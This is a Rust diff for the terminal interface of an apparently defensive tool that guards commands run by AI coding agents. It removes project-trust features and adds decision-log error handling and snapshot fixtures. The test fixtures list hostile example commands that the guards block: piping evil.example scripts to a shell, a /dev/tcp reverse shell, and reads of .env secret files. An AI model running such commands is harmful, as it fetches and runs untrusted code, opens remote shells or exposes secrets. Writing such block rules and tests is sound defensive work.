@@ -571,13 +729,13 @@ impl App {
     /// ends in a refresh.
     pub(crate) fn apply_guards(&mut self) {
         if self.pending.is_empty() {
-            self.info("no guard changes to apply");
+            self.info("no changes to apply");
             return;
         }
         for change in &self.pending {
             if let Err(error) = validate_guard_change(change) {
                 self.error(format!(
-                    "guard `{}` was not applied: {error}",
+                    "`{}` was not applied: {error}",
                     change.target().name()
                 ));
                 self.refresh();
@@ -609,10 +767,10 @@ impl App {
         warnings.sort();
         warnings.dedup();
         if warnings.is_empty() {
-            self.success(format!("{total} guard change(s) applied"));
+            self.success(format!("{total} change(s) applied"));
         } else {
             self.warning(format!(
-                "{total} guard change(s) applied; {}",
+                "{total} change(s) applied; {}",
                 warnings.join("; ")
             ));
         }
@@ -628,32 +786,6 @@ impl App {
             });
             false
         }
-    }
-
-    /// Counts the current project's guard bundles for the trust modal.
-    pub(crate) fn request_trust_current(&mut self) {
-        let Some(path) = self.current_project.clone() else {
-            self.error("current project root cannot be resolved");
-            return;
-        };
-        if self.projects.iter().any(|project| project.path == path) {
-            self.info("the current project is already trusted");
-            return;
-        }
-        let proposals = guard_proposals(&path);
-        self.confirmation = Some(Confirmation::TrustCurrent { path, proposals });
-    }
-
-    pub(crate) fn request_untrust_selected(&mut self) {
-        let Some((path, approvals)) = self.selected_project().and_then(|project| {
-            project
-                .trusted
-                .map(|trusted| (trusted.path.clone(), trusted.configured_guards))
-        }) else {
-            self.info("the selected project is not trusted");
-            return;
-        };
-        self.confirmation = Some(Confirmation::UntrustProject { path, approvals });
     }
 
     pub(crate) fn request_runtime(&mut self, install: bool) {
@@ -708,47 +840,15 @@ impl App {
 
     pub(crate) fn cancel_confirmation(&mut self) {
         self.confirmation = None;
-        self.confirmation_scroll = 0;
     }
 
-    /// Runs the open confirmation. Guard approval only stages; trusting,
-    /// untrusting, runtime wiring, and waking write host state immediately.
+    /// Runs the open confirmation. Runtime wiring and waking write host state
+    /// immediately.
     pub(crate) fn confirm(&mut self) {
         let Some(confirmation) = self.confirmation.take() else {
             return;
         };
-        self.confirmation_scroll = 0;
         match confirmation {
-            Confirmation::ApproveGuard {
-                target,
-                hash,
-                reapproval,
-                ..
-            } => {
-                self.stage_guard(target, true, Some(hash));
-                self.success(if reapproval {
-                    "guard re-enable staged; press Enter to apply"
-                } else {
-                    "guard enable staged; press Enter to apply"
-                });
-            }
-            Confirmation::ViewGuard { .. } => {}
-            Confirmation::TrustCurrent { path, .. } => match trust_root(&path) {
-                Ok(path) => {
-                    self.success(format!("trusted project {path}"));
-                    self.refresh();
-                }
-                Err(error) => self.error(error),
-            },
-            Confirmation::UntrustProject { path, .. } => match untrust_root(&path) {
-                Ok((path, removed)) => {
-                    self.success(format!(
-                        "untrusted project {path}; disabled {removed} project guard(s)"
-                    ));
-                    self.refresh();
-                }
-                Err(error) => self.error(error),
-            },
             Confirmation::ConfigureRuntime {
                 runtime,
                 install,
@@ -778,15 +878,12 @@ impl App {
         }
     }
 
-    /// Re-reads guards, trusted projects, runtime wiring, the current project,
-    /// and, outside tests, the decision log.
+    /// Re-reads guards, runtime wiring, and, outside tests, the decision log.
     pub(crate) fn refresh(&mut self) {
         let mut refresh_error = None;
         let mut refresh_warning = None;
-        (self.current_project, self.project_declared_guards) = current_project();
         match guard_entries() {
-            Ok((mut entries, diagnostics)) => {
-                apply_project_declarations(&mut entries, &self.project_declared_guards);
+            Ok((entries, diagnostics)) => {
                 self.guards = entries;
                 if !diagnostics.is_empty() {
                     refresh_warning = Some(diagnostics.join("; "));
@@ -794,21 +891,24 @@ impl App {
             }
             Err(error) => refresh_error = Some(error),
         }
-        match trusted_projects() {
-            Ok(projects) => self.projects = projects,
-            Err(error) => refresh_error = Some(error),
-        }
         #[cfg(not(test))]
         {
             self.log_size = log_size();
             match recent_log() {
-                Ok(view) => self.apply_reloaded_view(view),
-                Err(error) => refresh_error = Some(error),
+                Ok(view) => {
+                    self.undo_points = undo_points(&view.summary);
+                    self.apply_reloaded_view(view);
+                }
+                Err(error) => {
+                    let text = unreadable_log_message(&error);
+                    self.log_unreadable = Some(text.clone());
+                    refresh_error = Some(text);
+                }
             }
         }
         self.runtimes = runtime_entries();
-        self.guard_index = bounded(self.guard_index, self.visible_guards().len());
-        self.project_index = bounded(self.project_index, self.project_count());
+        self.stopped_custom_guards = stopped_custom_guards();
+        self.guard_index = bounded(self.guard_index, self.guard_rows().len());
         self.runtime_index = bounded(self.runtime_index, self.runtimes.len());
         self.log_index = bounded(self.log_index, self.filtered_log().len());
         if let Some(error) = refresh_error {
@@ -826,86 +926,48 @@ impl App {
         }
     }
 
-    /// Tails the audit file from every screen, so decisions arriving elsewhere
-    /// still badge the log tab. Policies, projects, and runtimes still reload
+    /// Tails the decision log from every screen, so decisions arriving elsewhere
+    /// still badge the log tab. Guards and runtimes still reload
     /// only on an explicit refresh.
+    ///
+    /// A log whose last read failed, as while another process holds it, is
+    /// read again on every tick, since its size may never change.
     pub(crate) fn poll_log(&mut self) {
         let size = log_size();
-        if size == self.log_size {
+        if size == self.log_size && self.log_unreadable.is_none() {
+            // Retention or a prune removes snapshots without a log append.
+            if self.summary_open {
+                self.undo_points = undo_points(&self.log_summary);
+            }
             return;
         }
         self.log_size = size;
         match recent_log() {
-            Ok(view) => self.apply_reloaded_view(view),
-            Err(error) => self.error(error),
+            Ok(view) => {
+                self.undo_points = undo_points(&view.summary);
+                self.apply_reloaded_view(view);
+            }
+            Err(error) => {
+                let text = unreadable_log_message(&error);
+                if self.log_unreadable.as_ref() != Some(&text) {
+                    self.error(text.clone());
+                }
+                self.log_unreadable = Some(text);
+            }
         }
     }
 
     /// Re-reads the global nap on the tick, so the countdown ticks down and the
     /// banner clears on expiry or on a `nah wake` run in another terminal.
     pub(crate) fn poll_nap(&mut self) {
-        self.nap = nap_status();
+        (self.nap, self.other_version_nap) = nap_status();
     }
 
     pub(crate) fn selected_guard(&self) -> Option<&GuardEntry> {
-        (self.screen == Screen::Guards)
-            .then(|| self.visible_guards().get(self.guard_index).copied())
-            .flatten()
-    }
-
-    pub(crate) fn project_count(&self) -> usize {
-        self.projects.len() + usize::from(self.current_project_is_untrusted())
-    }
-
-    pub(crate) fn project_at(&self, index: usize) -> Option<ProjectSelection<'_>> {
-        if self.current_project_is_untrusted() {
-            if index == 0 {
-                return self
-                    .current_project
-                    .as_deref()
-                    .map(|path| ProjectSelection {
-                        path,
-                        trusted: None,
-                        current: true,
-                    });
-            }
-            return self
-                .projects
-                .get(index - 1)
-                .map(|project| self.project_selection(project));
+        if self.screen != Screen::Guards {
+            return None;
         }
-        self.projects
-            .get(index)
-            .map(|project| self.project_selection(project))
-    }
-
-    pub(crate) fn selected_project(&self) -> Option<ProjectSelection<'_>> {
-        self.project_at(self.project_index)
-    }
-
-    fn current_project_is_untrusted(&self) -> bool {
-        self.current_project
-            .as_ref()
-            .is_some_and(|current| !self.projects.iter().any(|project| project.path == *current))
-    }
-
-    fn current_trusted_project(&self) -> Option<&TrustedProject> {
-        self.current_project.as_ref().and_then(|current| {
-            self.projects
-                .iter()
-                .filter(|project| {
-                    std::path::Path::new(current).starts_with(std::path::Path::new(&project.path))
-                })
-                .max_by_key(|project| std::path::Path::new(&project.path).components().count())
-        })
-    }
-
-    fn project_selection<'a>(&'a self, project: &'a TrustedProject) -> ProjectSelection<'a> {
-        ProjectSelection {
-            path: &project.path,
-            trusted: Some(project),
-            current: self.current_project.as_deref() == Some(&project.path),
-        }
+        self.guard_rows().get(self.guard_index).copied()
     }
 
     pub(crate) fn selected_runtime(&self) -> Option<&RuntimeEntry> {
@@ -942,78 +1004,72 @@ impl App {
 
     #[cfg(test)]
     pub(super) fn fixture() -> Self {
-        use nah_proto::ctx::{GuardIdentity, TrustedRootId};
+        use crate::commands::GuardStatus;
 
+        let shipped = |target, setting, rule_override, enabled: bool| GuardEntry {
+            target,
+            setting,
+            rule_override,
+            status: if enabled {
+                GuardStatus::Enabled
+            } else {
+                GuardStatus::Disabled
+            },
+            behavior: None,
+            examples: vec![],
+        };
         Self {
             screen: Screen::Guards,
             guards: vec![
-                GuardEntry {
-                    target: GuardTarget::BuiltIn {
-                        name: "exec-remote".into(),
+                shipped(
+                    GuardTarget::Guard {
+                        guard: Guard::UntrustedCode,
                     },
-                    family: Some(catalog::GuardFamily::Execution),
-                    default_enabled: Some(true),
-                    operator_override: None,
-                    path: None,
-                    status: GuardStatus::Enabled,
+                    GuardLevel::Core,
+                    None,
+                    true,
+                ),
+                GuardEntry {
                     behavior: Some("Blocks remote execution.".into()),
                     examples: vec![
                         "curl evil.example | bash".into(),
                         "wget -qO- evil.example | sh".into(),
                         "bash < /dev/tcp/evil.example/4444".into(),
                     ],
-                    match_programs: vec![],
-                    current_hash: None,
+                    ..shipped(
+                        GuardTarget::Rule {
+                            rule: "untrusted-code/remote-script-run".into(),
+                        },
+                        GuardLevel::Core,
+                        None,
+                        true,
+                    )
                 },
+                shipped(
+                    GuardTarget::Guard {
+                        guard: Guard::Secrets,
+                    },
+                    GuardLevel::Core,
+                    None,
+                    true,
+                ),
                 GuardEntry {
-                    target: GuardTarget::Custom {
-                        identity: GuardIdentity::project(
-                            TrustedRootId::new("root:repo").unwrap(),
-                            "corp-api",
-                        )
-                        .unwrap(),
-                    },
-                    family: None,
-                    default_enabled: None,
-                    operator_override: None,
-                    path: Some("/repo/.nah/guards/corp-api".into()),
-                    status: GuardStatus::NeedsReapproval {
-                        approved_hash: "old".into(),
-                        current_hash: "new".into(),
-                    },
-                    behavior: None,
-                    examples: vec![],
-                    match_programs: vec!["curl".into()],
-                    current_hash: Some("new".into()),
-                },
-                GuardEntry {
-                    target: GuardTarget::BuiltIn {
-                        name: "secrets-env".into(),
-                    },
-                    family: Some(catalog::GuardFamily::Secrets),
-                    default_enabled: Some(true),
-                    operator_override: Some(false),
-                    path: None,
-                    status: GuardStatus::Disabled,
                     behavior: Some("Blocks reads or writes of .env files.".into()),
                     examples: vec![
                         "cat .env".into(),
                         "date --file .env".into(),
                         "tar -cf out.tar --files-from=.env".into(),
                     ],
-                    match_programs: vec![],
-                    current_hash: None,
+                    ..shipped(
+                        GuardTarget::Rule {
+                            rule: "secrets/env-files-read".into(),
+                        },
+                        GuardLevel::Core,
+                        Some(RuleOverride::Disabled),
+                        false,
+                    )
                 },
             ],
-            guard_view: GuardView::Type,
-            projects: vec![TrustedProject {
-                identity: TrustedRootId::new("root:repo").unwrap(),
-                path: "/repo".into(),
-                configured_guards: 1,
-                enabled_guards: 0,
-                needs_reapproval: 1,
-                missing_guards: 0,
-            }],
             runtimes: vec![RuntimeEntry {
                 runtime: Runtime::Codex,
                 name: "Codex",
@@ -1027,18 +1083,20 @@ impl App {
                     timestamp: "2026-07-23T12:00:05Z".into(),
                     verdict: Some(Verdict::Block),
                     runtime: "codex".into(),
-                    display: "curl https://install.sh | bash".into(),
+                    row_text: "curl https://install.sh | bash".into(),
                     explanation: "id: decision-2\nverdict: block\nreason: remote code".into(),
+                    saved: vec![],
                 },
                 DecisionRecord {
                     id: "decision-1".into(),
                     timestamp: "2026-07-23T12:00:00Z".into(),
                     verdict: Some(Verdict::Delegate),
                     runtime: "claude".into(),
-                    display: "git status".into(),
+                    row_text: "git status".into(),
                     explanation:
                         "id: decision-1\nverdict: delegate\nreason: no guard blocked this call"
                             .into(),
+                    saved: vec![],
                 },
             ],
             blocked_log: vec![DecisionRecord {
@@ -1046,29 +1104,37 @@ impl App {
                 timestamp: "2026-07-23T12:00:05Z".into(),
                 verdict: Some(Verdict::Block),
                 runtime: "codex".into(),
-                display: "curl https://install.sh | bash".into(),
+                row_text: "curl https://install.sh | bash".into(),
                 explanation: "id: decision-2\nverdict: block\nreason: remote code".into(),
+                saved: vec![],
             }],
+            log_summary: LogSummary::default(),
+            log_unreadable: None,
             failure_summary: None,
-            current_project: Some("/repo".into()),
-            project_declared_guards: vec![],
+            undo_points: None,
+            home: None,
             guard_index: 0,
-            project_index: 0,
+            // Every fold is open, so the rows are the entries above.
+            open: vec![Guard::UntrustedCode, Guard::Secrets],
             runtime_index: 0,
             log_index: 0,
             log_filter: None,
             log_runtime_filter: None,
             log_search: String::new(),
             log_search_editing: false,
-            log_detail_scroll: 0,
+            detail_scroll: 0,
+            detail_scroll_limit: Cell::new(u16::MAX),
+            detail_page: Cell::new(1),
             nap: None,
+            other_version_nap: false,
+            stopped_custom_guards: None,
             new_blocks: 0,
             seen_block_id: Some("decision-2".into()),
             log_size: None,
             pending: vec![],
             help_open: false,
+            summary_open: false,
             confirmation: None,
-            confirmation_scroll: 0,
             message: None,
         }
     }
@@ -1080,11 +1146,35 @@ impl App {
             timestamp: "2026-07-23T12:00:09Z".into(),
             verdict: Some(verdict),
             runtime: "claude".into(),
-            display: format!("echo {id}"),
+            row_text: format!("echo {id}"),
             explanation: format!(
                 "id: {id}\nverdict: {}",
                 crate::records::verdict_name(verdict)
             ),
+            saved: vec![],
+        }
+    }
+
+    /// A discard that save-then-run snapshotted, as the decision log stores it:
+    /// a delegate that carries its snapshot, explained as `nah log` shows it.
+    #[cfg(test)]
+    pub(super) fn saved_record_fixture(id: &str) -> DecisionRecord {
+        DecisionRecord {
+            id: id.into(),
+            timestamp: "2026-07-23T12:00:11Z".into(),
+            verdict: Some(Verdict::Delegate),
+            runtime: "claude".into(),
+            row_text: "git reset --hard".into(),
+            explanation: format!(
+                "id: {id}\nverdict:  delegate\nreason:   work/changes-discard saved snapshot 0dec7505, then let the call run\nsaved:    snapshot 0dec7505 by work/changes-discard: 8 files, 51 lines\nin:       /repo\nundo:     nah undo 0dec7505\n\ncommand:  git reset --hard"
+            ),
+            saved: vec![crate::records::SavedSnapshot {
+                rules: vec!["work/changes-discard".into()],
+                snapshot: "0dec7505".into(),
+                root: "/repo".into(),
+                holds: "8 files, 51 lines".into(),
+                apart: false,
+            }],
         }
     }
 
@@ -1095,19 +1185,9 @@ impl App {
             timestamp: "2026-07-23T12:00:10Z".into(),
             verdict: None,
             runtime: "claude".into(),
-            display: format!("echo {id}"),
+            row_text: format!("echo {id}"),
             explanation: format!("id: {id}\nstatus: unavailable\nreason: observation failed"),
-        }
-    }
-}
-
-fn apply_project_declarations(guards: &mut [GuardEntry], declared: &[String]) {
-    for guard in guards {
-        if matches!(guard.target, GuardTarget::BuiltIn { .. })
-            && declared.iter().any(|name| name == guard.target.name())
-            && guard.operator_override != Some(false)
-        {
-            guard.status = GuardStatus::Enabled;
+            saved: vec![],
         }
     }
 }
@@ -1130,66 +1210,12 @@ fn append_footer_warnings(message: Option<Message>, warnings: Vec<String>) -> Op
     })
 }
 
-fn guard_family_scope_rank(entry: &GuardEntry) -> (bool, usize) {
-    match entry.family {
-        Some(family) => (false, family.rank()),
-        None => (
-            true,
-            match entry.target.scope() {
-                Some(nah_proto::ctx::GuardScope::User) => 0,
-                Some(nah_proto::ctx::GuardScope::Project) => 1,
-                None => 2,
-            },
-        ),
-    }
-}
-
-fn guard_type_rank(entry: &GuardEntry) -> (bool, usize) {
-    entry
-        .family
-        .map_or((true, 0), |family| (false, family.rank()))
-}
-
-fn guard_status_rank(status: &GuardStatus) -> u8 {
-    match status {
-        GuardStatus::Enabled => 0,
-        GuardStatus::Disabled => 1,
-        GuardStatus::NeedsReapproval { .. } => 2,
-        GuardStatus::Missing { .. } => 3,
-    }
-}
-
-/// Custom guards stay inactive until a human approves them. Built-ins carry
-/// their own compiled factory posture.
-fn default_enabled(entry: &GuardEntry) -> bool {
-    entry.default_enabled.unwrap_or(false)
-}
-
-/// A stale approval record, whether its files changed or vanished, is never
-/// the shipped posture, so a reset always stages its removal.
-fn at_default(entry: &GuardEntry) -> bool {
-    if matches!(entry.target, GuardTarget::BuiltIn { .. }) {
-        return entry.operator_override.is_none();
-    }
-    let default = default_enabled(entry);
-    match entry.status {
-        GuardStatus::Enabled => default,
-        GuardStatus::Disabled => !default,
-        GuardStatus::NeedsReapproval { .. } | GuardStatus::Missing { .. } => false,
-    }
+fn unreadable_log_message(error: &str) -> String {
+    format!("decision log is unreadable: {error}")
 }
 
 fn bounded(index: usize, len: usize) -> usize {
     if len == 0 { 0 } else { index.min(len - 1) }
-}
-
-/// Upper bound on the lines a wrapped pane renders for `text`.
-fn wrapped_lines(text: &str) -> u16 {
-    let lines = text
-        .lines()
-        .map(|line| 1 + line.chars().count() / WRAP_WIDTH)
-        .sum::<usize>();
-    u16::try_from(lines).unwrap_or(u16::MAX)
 }
 
 pub(crate) const fn status_name(status: RuntimeHookStatus) -> &'static str {
